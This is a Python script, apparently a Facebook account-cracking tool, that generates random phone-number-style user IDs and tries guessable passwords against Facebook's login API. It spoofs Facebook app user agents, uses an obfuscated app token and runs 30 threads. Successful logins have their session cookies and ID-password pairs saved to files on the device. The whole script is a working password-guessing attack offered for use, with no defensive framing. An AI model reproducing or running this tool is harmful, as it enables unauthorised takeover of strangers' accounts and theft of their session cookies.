import os,sys
try:
    import uuid,string,base64,zlib,re
    import os,sys,time,random,requests,urllib3,bs4,mechanize,subprocess,json
    from concurrent.futures import ThreadPoolExecutor
except ModuleNotFoundError:
    os.system('pip install requests bs4 mechanize')
    os.system('python Bipul.py')

W='\033[1;37m'
G='\033[38;5;46m'
R='\033[38;5;196m'
P='\033[38;5;203m'
I='\33[1;34m'
Y='\033[38;5;208m'
B='\033[38;5;45m'
L='\033[38;5;49m'
X='\033[38;5;65m'
bou=[]
ok=[]
loop=0
cp=[]
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
_Tani_Tedy = str(os.getuid())
_Tedy_Panda = f'==[Bipul]==[{_Tani_Tedy[1:]}~TEDY~{_Tani_Tedy[:4]}]==[Bipul]=='


def clear():
    os.system('clear')
    print(f"""
  \33[1;32m  ________  __      ____  __  ____  _______
 \33[1;33m  / ____/ / / /     / __ \/ / / /  |/  /  _/
 \33[1;31m / /_  / /_/ /_____/ /_/ / / / / /|_/ // /  
 \33[1;34m/ __/ / __  /_____/ _, _/ /_/ / /  / // /   
\33[1;32m/_/   /_/ /_/     /_/ |_|\____/_/  /_/___/  {X}({G}8{X})
{I}----------------------------------------------
{W}[\033[38;5;47m-{W}]\033[38;5;47m Facebook : Bipul Khan
{W}[{P}-{W}]{P} Github   : Bipul159
{W}[{L}-{W}]{L} Quality  : PREMIUM
{I}----------------------------------------------""")
def linex():
    print(f'{I}----------------------------------------------')
def akash():
    model = random.choice(['SM-A205F','SM-A205FN','SM-A205GN','SM-A205YN','SM-A205G','SM-A205W','SM-A205U','SM-A205S','SM-S205DL','SM-A205U1'])
    local = random.choice(['en_US','en_GB'])
    end = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(11,99))+'.'+str(random.randint(111,999))+';FBBV/'+str(random.randint(111111111,999999999))+';'+'FBDM/{density=1.5,width=480,height=800};FBLC/'+str(local)+';FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(model)+';FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
    ua = 'Davik/2.1.0 (Linux; U; Android '+str(random.randint(5,14))+'.0.1; '+str(model)+' Build/QP1A.190711.020) '+end
    return ua

def main():
    clear()
    print(f'{W}[{G}1{W}]{G} Random Cloning\n{W}[{G}2{W}]{B} Contact Admin\n{W}[{G}3{W}]{P} Exit Program');linex()
    Bipul = input(f'{W}[{G}-{W}]{W} choose an option {R}:{B} ');linex()
    if Bipul in ['1']:
        Bipul_rndm()
    elif Bipul in ['2']:
        os.system(f'xdg-open {url}')
    else:
        sys.exit()
def Bipul_rndm():
    clear()
    print(f'{W}[{Y}-{W}]{Y} example  : 015,016,017,018,019')
    code = input(f'{W}[{L}-{W}]{L} Choose   {R}:{G} ');linex()
    print(f'{W}[{P}-{W}]{P} example  : 5000,10000,15000')
    limit = int(input(f'{W}[{B}-{W}]{B} Choose   {R}:{G} '));linex()
    print(f'{W}[\033[38;5;48m-{W}]\033[38;5;48m server   : A')
    mt = input(f'{W}[{R}-{W}]{R} Choose   {R}:{G} ');linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        bou.append(nmp)
    with ThreadPoolExecutor(max_workers=30) as Tani:
        print(f'{W}[\033[38;5;134m-{W}]\033[38;5;134m Total uid from crack :{G} {str(len(bou))}')
        print(f'{W}[{P}-{W}]{P} Use flight or apn for good results....');linex()
        for love in bou:
            ids = code + love
            psd = [love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]#,'hridoy','shahin','jahidul','jannat','nusrat','mababa','mohuya','problem','sadiya','shamim','alamin','tamanna','bushra','sabbir','mahidul','farjana','77889900','09876543','ff lover','bangladesh','Bangladesh','Bangla','bangla','i love you','free fire','pubg lover','102030','304050','506070','708090','203040',',405060','607080']
            if mt in ['1','A']:
                Tani.submit(api1,ids,psd)
            elif mt in ['2','B']:
                Tani.submit(api1,ids,psd)
            else:
                Tani.submit(api1,ids,psd)
    print('')
    linex()
    print(f'\033[38;5;200m - Total ok id : {G}{str(len(ok))}')
    linex()
def api1(ids,psd):
    global loop,ok
    mx = random.choice([P,G,R,B,Y])
    sys.stdout.write(f'\r\r \033[0;37m[{mx}Bipul-XD\033[0;37m]--[{G}{loop}\033[0;37m]--[OK:-{G}{len(ok)}\033[0;37m]');sys.stdout.flush()
    try:
        for pas in psd:
            rnx = random.Random()
            adid = str(''.join(rnx.choices(string.hexdigits, k=16)))
            data = {'adid':adid,'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate'}
            headers={'Authorization':f'OAuth 3'+'5'+'068'+'55317'+'28|62'+'f8ce'+'9f'+'74b'+'12'+'f8'+'4c12'+'3c'+'c2'+'343'+'7a'+'4a'+'32','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':akash(),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-g'+'raph.fa'+'ceb'+'oo'+'k.com'+'/au'+'th/log'+'in'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);rmx = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={rmx};{ckkk}"
                uid = str(po['uid'])
                print(f'\r\r {G} [Bipul-OK] {uid} - {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f" {W}Cookie= "+coki);linex()
                open('/sdcard/Bipul-COOKIE.txt','a').write(coki+'\n')
                open('/sdcard/Bipul-RNDM-OK.txt','a').write(uid+'|'+pas+'\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r{P}-[Bipul-CP] {uid} | {pas}')
                open('/sdcard/Bipul/RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                cp.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

if __name__=='__main__':
    main()